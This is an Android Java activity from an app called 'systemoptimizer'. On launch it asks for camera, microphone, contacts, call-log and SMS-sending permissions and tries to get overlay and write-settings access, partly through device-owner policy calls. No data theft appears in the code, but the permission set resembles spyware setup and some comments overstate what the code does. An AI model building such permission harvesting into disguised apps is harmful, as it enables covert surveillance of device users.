package com.example.systemoptimizer;

import android.app.Activity;
import android.app.AppOpsManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;
import androidx.activity.ComponentActivity;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class PermissionCenterActivity extends ComponentActivity {

    public static final String[] RUNTIME_PERMISSIONS;
    private static final String TAG = "PermissionCenter";

    static {
        List<String> base = new ArrayList<>();

        base.add(android.Manifest.permission.CAMERA);
        base.add(android.Manifest.permission.RECORD_AUDIO);
        base.add(android.Manifest.permission.READ_CONTACTS);
        base.add(android.Manifest.permission.READ_CALL_LOG);
        base.add(android.Manifest.permission.SEND_SMS);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            base.add(android.Manifest.permission.POST_NOTIFICATIONS);
        }

        RUNTIME_PERMISSIONS = base.toArray(new String[0]);
    }

    private final ActivityResultLauncher<String[]> runtimeLauncher =
            registerForActivityResult(
                    new ActivityResultContracts.RequestMultiplePermissions(),
                    ignored -> {
                        Log.i(TAG, "Runtime permissions result received");
                        refresh();
                    });

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Attempt to grant special permissions automatically first
        Log.i(TAG, "Initializing Permission Center");
        
        // 1. Try to grant Display Over Other Apps
        if (!hasOverlayPermission()) {
            Log.i(TAG, "Overlay permission missing - Attempting to grant programmatically");
            grantOverlayPermission();
        }

        // 2. Try to grant Write Settings
        if (!hasWriteSettingsPermission()) {
            Log.i(TAG, "Write Settings permission missing - Attempting to grant programmatically");
            grantWriteSettingsPermission();
        }

        // 3. Check if runtime permissions are missing
        String[] missing = allMissingRuntimePermissions();

        if (missing.length > 0) {
            Log.i(TAG, "Runtime permissions missing: " + java.util.Arrays.toString(missing));
            runtimeLauncher.launch(missing);
        } else {
            Log.i(TAG, "All permissions granted - Starting BackgroundService");
            startServiceAndFinish();
        }
    }

    private void refresh() {
        String[] missing = allMissingRuntimePermissions();
        if (missing.length > 0) {
            Log.w(TAG, "Permissions still missing after refresh: " + java.util.Arrays.toString(missing));
            Toast.makeText(this, "Please grant all permissions to continue.", Toast.LENGTH_LONG).show();
        } else {
            Log.i(TAG, "Permissions all granted. Proceeding.");
            startServiceAndFinish();
        }
    }

    // --- Programmatically Grant Special Permissions using Device Owner ---

    private boolean hasOverlayPermission() {
        return Settings.canDrawOverlays(this);
    }

    private void grantOverlayPermission() {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        Log.w(TAG, "Overlay permission must be handled through system settings.");
        openSystemSettings("overlay");
    }
    }

    private boolean hasWriteSettingsPermission() {
        return Settings.System.canWrite(this);
    }

private void grantWriteSettingsPermission() {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        try {
            DevicePolicyManager dpm =
                    (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);

            ComponentName admin =
                    new ComponentName(this, DeviceAdminReceiver.class);

            if (dpm != null) {
                dpm.setSystemSetting(
                        admin,
                        Settings.System.ACCELEROMETER_ROTATION,
                        "0"
                );
            }

            if (Settings.System.canWrite(this)) {
                Log.i(TAG, "Write Settings permission is available.");
                return;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error handling Write Settings", e);
        }

        Log.w(TAG, "Opening Write Settings system page.");
        openSystemSettings("write_settings");
    }
}

    private void openSystemSettings(String type) {
        Intent intent;
        if ("overlay".equals(type)) {
            intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
        } else {
            intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS, Uri.parse("package:" + getPackageName()));
        }
        startActivity(intent);
    }

    // --- Runtime Permission Logic (Existing) ---

    private String[] allMissingRuntimePermissions() {
        List<String> missing = new ArrayList<>();

        for (String perm : RUNTIME_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    perm
            ) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                missing.add(perm);
            }
        }

        return missing.toArray(new String[0]);
    }

    public static boolean setupComplete(Context context) {
        for (String perm : RUNTIME_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(
                    context,
                    perm
            ) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void startServiceAndFinish() {
        Log.i(TAG, "Permission setup complete - returning to MainActivity");

        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);

        startActivity(intent);
        finish();
    }
}